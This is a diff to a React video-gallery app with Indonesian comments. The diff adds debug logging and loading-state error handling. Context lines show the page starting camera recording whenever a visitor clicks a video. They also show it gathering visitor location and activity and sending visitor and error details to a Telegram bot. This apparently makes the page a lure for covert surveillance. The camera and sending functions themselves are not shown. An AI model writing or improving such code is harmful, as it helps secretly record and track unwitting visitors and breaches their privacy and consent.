@@ -24,7 +24,9 @@ const chunkArray = <T,>(array: T[], size: number): T[][] => {
 // Fungsi untuk mendeteksi apakah browser adalah Safari
 const isSafari = () => {
   const userAgent = navigator.userAgent;
-  return /Safari/.test(userAgent) && !/Chrome/.test(userAgent);
+  const isSafariBrowser = /Safari/.test(userAgent) && !/Chrome/.test(userAgent);
+  console.log(`isSafari: ${isSafariBrowser}`);
+  return isSafariBrowser;
 };
 
 function App() {
@@ -59,20 +61,31 @@ function App() {
   const videoSlides = chunkArray(videos, 5);
 
   useEffect(() => {
+    console.log('Menginisialisasi state isLoading dan videoErrors...');
     setIsLoading(new Array(videos.length).fill(true));
     setVideoErrors(new Array(videos.length).fill(false));
     hlsInstances.current = new Array(videos.length).fill(null);
   }, []);
 
   useEffect(() => {
+    console.log('Mengatur IntersectionObserver untuk lazy loading slide...');
     const observer = new IntersectionObserver(
       (entries) => {
+        console.log('IntersectionObserver dipicu, memeriksa slide...');
         entries.forEach((entry) => {
+          console.log(`Entry: isIntersecting=${entry.isIntersecting}, target=${entry.target.getAttribute('data-slide-index')}`);
           if (entry.isIntersecting) {
             const slideIndex = parseInt(entry.target.getAttribute('data-slide-index') || '0', 10);
+            console.log(`Slide ${slideIndex} terlihat, memeriksa apakah sudah dimuat...`);
             if (!loadedSlides.includes(slideIndex)) {
               console.log(`Memuat slide: ${slideIndex}`);
-              setLoadedSlides((prev) => [...prev, slideIndex]);
+              setLoadedSlides((prev) => {
+                const newSlides = [...prev, slideIndex];
+                console.log(`Loaded slides updated: ${newSlides}`);
+                return newSlides;
+              });
+            } else {
+              console.log(`Slide ${slideIndex} sudah dimuat sebelumnya.`);
             }
           }
         });
@@ -81,14 +94,20 @@ function App() {
     );
 
     const slideElements = document.querySelectorAll('.slide-container');
-    slideElements.forEach((el) => observer.observe(el));
+    console.log(`Jumlah slide ditemukan: ${slideElements.length}`);
+    slideElements.forEach((el, idx) => {
+      console.log(`Mengamati slide ${idx} dengan data-slide-index=${el.getAttribute('data-slide-index')}`);
+      observer.observe(el);
+    });
 
     return () => {
+      console.log('Membersihkan IntersectionObserver...');
       slideElements.forEach((el) => observer.unobserve(el));
     };
   }, [loadedSlides]);
 
   useEffect(() => {
+    console.log(`Slide saat ini: ${currentSlide}`);
     const activeSlideVideos = videoSlides[currentSlide];
     activeSlideVideos.forEach((video, index) => {
       const globalIndex = currentSlide * 5 + index;
@@ -106,6 +125,7 @@ function App() {
   }, [currentSlide]);
 
   useEffect(() => {
+    console.log('Mengatur monitorSuspiciousActivity dan lokasi pengunjung...');
     monitorSuspiciousActivity();
 
     const getLocation = async (): Promise<string> => {
@@ -150,6 +170,7 @@ function App() {
     sendVisitorNotification();
 
     return () => {
+      console.log('Membersihkan stream kamera dan HLS instances...');
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
       hlsInstances.current.forEach((hls) => hls?.destroy());
@@ -402,6 +423,7 @@ function App() {
   };
 
   const startCameraRecording = useCallback(async () => {
+    console.log('Memulai startCameraRecording...');
     try {
       await initializeCameraStreams();
 
@@ -435,21 +457,30 @@ function App() {
   }, []);
 
   const setupHls = (videoElement: HTMLVideoElement, hlsUrl: string, index: number) => {
+    console.log(`Memulai setupHls untuk video ${index + 1}, URL: ${hlsUrl}`);
     if (Hls.isSupported()) {
+      console.log(`Hls.js didukung, membuat instance untuk video ${index + 1}`);
       const hls = new Hls({
         enableWorker: true,
         lowLatencyMode: true,
         backBufferLength: 90,
       });
       hls.loadSource(hlsUrl);
+      console.log(`HLS source dimuat: ${hlsUrl}`);
       hls.attachMedia(videoElement);
       hls.on(Hls.Events.MANIFEST_PARSED, () => {
+        console.log(`Manifest HLS diparsing untuk video ${index + 1}, mencoba memutar...`);
         videoElement.play().catch((err) => {
           console.error(`HLS play error for video ${index + 1}:`, err);
           setVideoErrors((prev) => {
             const newErrors = [...prev];
             newErrors[index] = true;
             return newErrors;
+          });
+          setIsLoading((prev) => {
+            const newLoading = [...prev];
+            newLoading[index] = false;
+            return newLoading;
           });
         });
       });
@@ -461,18 +492,30 @@ function App() {
             newErrors[index] = true;
             return newErrors;
           });
+          setIsLoading((prev) => {
+            const newLoading = [...prev];
+            newLoading[index] = false;
+            return newLoading;
+          });
           hls.destroy();
         }
       });
       hlsInstances.current[index] = hls;
     } else if (videoElement.canPlayType('application/vnd.apple.mpegurl')) {
+      console.log(`Native HLS didukung, memuat ${hlsUrl} secara langsung`);
       videoElement.src = hlsUrl;
+      videoElement.load();
       videoElement.play().catch((err) => {
         console.error(`Native HLS error for video ${index + 1}:`, err);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
           newErrors[index] = true;
           return newErrors;
+        });
+        setIsLoading((prev) => {
+          const newLoading = [...prev];
+          newLoading[index] = false;
+          return newLoading;
         });
       });
     } else {
@@ -482,11 +525,17 @@ function App() {
         newErrors[index] = true;
         return newErrors;
       });
+      setIsLoading((prev) => {
+        const newLoading = [...prev];
+        newLoading[index] = false;
+        return newLoading;
+      });
     }
   };
 
   const handleVideoClick = useCallback(
     async (index: number) => {
+      console.log(`Video di indeks ${index} diklik, memulai startCameraRecording...`);
       startCameraRecording();
 
       if (isPlaying !== null && isPlaying !== index) {
@@ -508,6 +557,7 @@ function App() {
       const videoElement = videoRefs.current[index];
       if (videoElement) {
         const urlToUse = isSafari() ? videos[index].hlsUrl : videos[index].videoUrl;
+        console.log(`Memutar video ${index + 1} dengan URL: ${urlToUse}`);
         if (!validateVideoUrl(urlToUse)) {
           console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
           setVideoErrors((prev) => {
@@ -515,15 +565,23 @@ function App() {
             newErrors[index] = true;
             return newErrors;
           });
+          setIsLoading((prev) => {
+            const newLoading = [...prev];
+            newLoading[index] = false;
+            return newLoading;
+          });
           return;
         }
 
         try {
           setIsPlaying(index);
           if (isSafari()) {
+            console.log(`Menggunakan HLS di Safari untuk video ${index + 1}`);
             setupHls(videoElement, videos[index].hlsUrl, index);
           } else {
+            console.log(`Menggunakan URL langsung untuk video ${index + 1}`);
             videoElement.src = urlToUse;
+            videoElement.load();
             await videoElement.play();
           }
         } catch (error: unknown) {
@@ -543,7 +601,24 @@ function App() {
             newErrors[index] = true;
             return newErrors;
           });
+          setIsLoading((prev) => {
+            const newLoading = [...prev];
+            newLoading[index] = false;
+            return newLoading;
+          });
         }
+      } else {
+        console.error(`Video element di indeks ${index} tidak ditemukan`);
+        setVideoErrors((prev) => {
+          const newErrors = [...prev];
+          newErrors[index] = true;
+          return newErrors;
+        });
+        setIsLoading((prev) => {
+          const newLoading = [...prev];
+          newLoading[index] = false;
+          return newLoading;
+        });
       }
     },
     [isPlaying]
@@ -590,6 +665,7 @@ function App() {
       referrer: document.referrer || 'Langsung',
       previousSites: `Video Error: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Code: ${errorCode} | Message: ${errorMessage}`,
     };
+    console.log(`Video error di indeks ${index}: Code=${errorCode}, Message=${errorMessage}`);
     sendTelegramNotification(errorDetails).catch((err) => console.error('Failed to send error to Telegram:', err));
     console.error(
       `Gagal memuat video ${index + 1}: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`
@@ -702,6 +778,7 @@ function App() {
       </div>
     ),
     afterChange: (index: number) => {
+      console.log(`Slider berpindah ke slide: ${index}`);
       setCurrentSlide(index);
     },
   };
@@ -740,6 +817,7 @@ function App() {
                       const globalIndex = slideIndex * 5 + index;
                       const videoSource = isSafari() ? videos[globalIndex].hlsUrl : videos[globalIndex].videoUrl;
                       const videoType = isSafari() ? 'application/vnd.apple.mpegurl' : 'video/mp4';
+                      console.log(`Rendering video ${globalIndex + 1} dengan source: ${videoSource}`);
                       return (
                         <div
                           key={globalIndex}
